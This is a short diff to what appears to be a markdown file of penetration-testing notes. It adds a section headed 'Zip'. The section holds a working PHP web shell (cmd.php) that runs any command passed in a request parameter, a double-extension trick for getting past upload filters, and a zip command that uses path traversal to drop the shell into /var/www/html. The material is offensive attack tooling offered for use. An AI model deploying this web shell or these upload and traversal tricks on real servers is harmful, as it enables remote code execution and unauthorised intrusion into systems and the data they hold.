@@ -68,4 +68,16 @@ use:
 curl -s -X GET "https://domain.com/uploads/aJEa412rsdfgF" | html2text | mdcat
 ```
 
+## Zip
 
+cmd.php
+
+```php
+<?php
+ echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
+?>
+```
+
+Bypass cmd.php.jpeg (- png,etc)
+
+zip -r cmd.zip ../../../../../../../../var/www/html/cmd.php
